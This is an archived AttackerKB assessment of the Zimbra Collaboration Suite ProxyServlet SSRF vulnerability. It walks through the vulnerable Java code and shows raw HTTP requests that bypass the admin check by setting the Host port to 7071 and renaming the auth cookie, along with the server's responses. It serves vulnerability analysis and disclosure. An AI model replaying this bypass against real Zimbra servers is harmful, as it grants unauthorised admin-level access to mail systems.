---
title: Zimbra Collaboration Suite ProxyServlet SSRF
author: jrobles-r7
score: 1
topic_attacker_value: 4
topic_exploitability: 3
topic_disclosure_date: '2019-04-30T18:29:00'
created: '2019-05-09T17:57:14.986067'
revision_date: '2020-03-15T04:22:22.595044'
assessment_id: c7f97e96-2ea5-48ed-9619-d623d9b79133
topic_id: c984f54d-dde6-486a-a81c-ca2578542809
topic_short_id: O5wfv26nXL
topic_slug: zimbra-collaboration-suite-proxyservlet-ssrf
akb_topic_url: https://attackerkb.com/topics/O5wfv26nXL/zimbra-collaboration-suite-proxyservlet-ssrf
akb_assessment_url: https://attackerkb.com/topics/O5wfv26nXL/zimbra-collaboration-suite-proxyservlet-ssrf#c7f97e96-2ea5-48ed-9619-d623d9b79133
author_ratings:
  attacker-value: 4
  confidence-in-ratings: 5
  effort-to-develop-exploit: 3
  exploitability: 3
  urgent-to-patch: 5
  used-successfully: 5
---

# Zimbra Collaboration Suite ProxyServlet SSRF

*Assessment by jrobles-r7, archived from [AttackerKB](https://attackerkb.com/topics/O5wfv26nXL/zimbra-collaboration-suite-proxyservlet-ssrf#c7f97e96-2ea5-48ed-9619-d623d9b79133).*

---

## Details

According to the blog post [A Saga of Code Executions on Zimbra](https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html) by An Trinh the SSRF vulnerability occurs during the handling of ProxyServlet requests. The diff to fix the server side request forgery issues can be found in Zimbra's github page for the [zm-mailbox repository](https://github.com/Zimbra/zm-mailbox/commit/291ab91fb4a6772899252e1ea0993094a6d54251#diff-9810ac0443103a17924be1842a6d9966). The diff for `ProxyServlet.java` moves a few checks outside of a conditional so that the checks are always performed.

The `doProxy` function contains the vulnerable code. As described in the blog post user input is used to determine whether the request will be treated as an admin request. Line 188 in `doProxy` calls `isAdminRequest`:

```
186     private void doProxy(HttpServletRequest req, HttpServletResponse resp) throws IOException {
187         ZimbraLog.clearContext();
188         boolean isAdmin = isAdminRequest(req);
189         AuthToken authToken = isAdmin ?
190                 getAdminAuthTokenFromCookie(req, resp, true) : getAuthTokenFromCookie(req, resp, true);
191         if (authToken == null) {
192             String zAuthToken = req.getParameter(QP_ZAUTHTOKEN);
193             if (zAuthToken != null) {
```

The following is the `isAdminRequest`:

```
180     protected boolean isAdminRequest(HttpServletRequest req) {
181         return req.getServerPort() == LC.zimbra_admin_service_port.intValue();
182     }
```

The `getServerPort` function returns the port number specified in the Host header and `LC.zimbra_admin_service_port` is 7071. If a request is sent with port 7071 in the Host header then the `isAdmin` variable will be set to true in `doProxy`. After `isAdmin` is set, an authentication token is read from the request. Since we want the request to be treated as an admin request we are interested in the `getAdminAuthTokenFromCookie` function. The function ends up checking for a valid cookie with the `ZM_ADMIN_AUTH_TOKEN` key. Note: A valid token is required but the key for the token should be changed to `ZM_ADMIN_AUTH_TOKEN` when exploiting the SSRF vulnerability.

Lines 222-234 check for a proxy target and whether the request is allowed based on permissions:

```
222         // sanity check
223         String target = req.getParameter(TARGET_PARAM);
224         if (target == null) {
225             resp.sendError(HttpServletResponse.SC_BAD_REQUEST);
226             return;
227         }
228
229         // check for permission
230         URL url = new URL(target);
231         if (!isAdmin && !checkPermissionOnTarget(url, authToken)) {
232             resp.sendError(HttpServletResponse.SC_FORBIDDEN);
233             return;
234         }
```

On line 231 we can see that if the user is an admin then the request is allowed but if the user is not an admin then a permissions check will be performed. To test the described issue, we can construct requests. The following request uses a valid user (non-admin) cookie and contains a proxy request to the admin port:

```
POST /service/proxy?target=https://127.0.0.1:7071/ HTTP/1.1
Host: zimbra.mylocaldomain.local:8443
Cookie: ZM_AUTH_TOKEN=0_f4c2aa41cd45987f5a459601320b5452ec993ad4_69643d33363a61303964323935332d363139642d343532612d383565352d3536346136616638393030383b6578703d31333a313535343339313631313239383b747970653d363a7a696d6272613b753d313a613b7469643d393a3635323737323132373b76657273696f6e3d31333a382e372e315f47415f313637303b637372663d313a313b;
Content-Length: 0


```

The response from the previous request returns a forbidden message:

```
HTTP/1.1 403 Forbidden
Date: Wed, 03 Apr 2019 11:54:45 GMT
Content-Type: text/html;charset=iso-8859-1
Cache-Control: must-revalidate,no-cache,no-store
Content-Length: 245

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 403 Forbidden</title>
</head>
<body><h2>HTTP ERROR 403</h2>
<p>Problem accessing /service/proxy. Reason:
<pre>    Forbidden</pre></p>
</body>
</html>
```

Next we modify the previous request, changing 8443 to 7071 and ZM_AUTH_TOKEN to ZM_ADMIN_AUTH_TOKEN, and resend it:

```
POST /service/proxy?target=https://127.0.0.1:7071/ HTTP/1.1
Host: zimbra.mylocaldomain.local:7071
Cookie: ZM_ADMIN_AUTH_TOKEN=0_f4c2aa41cd45987f5a459601320b5452ec993ad4_69643d33363a61303964323935332d363139642d343532612d383565352d3536346136616638393030383b6578703d31333a313535343339313631313239383b747970653d363a7a696d6272613b753d313a613b7469643d393a3635323737323132373b76657273696f6e3d31333a382e372e315f47415f313637303b637372663d313a313b;
Content-Length: 0


```

The response to the modified request does not contain a forbidden message this time and is instead a redirect the zimbraAdmin page:

```
HTTP/1.1 302 Found
Date: Wed, 03 Apr 2019 11:57:52 GMT
Content-Type: text/html;charset=utf-8
Date: Wed, 03 Apr 2019 11:57:52 GMT
X-Frame-Options: SAMEORIGIN
Expires: Tue, 24 Jan 2000 20:46:50 GMT
Location: https://127.0.0.1:7071/zimbraAdmin
Content-Length: 0

```
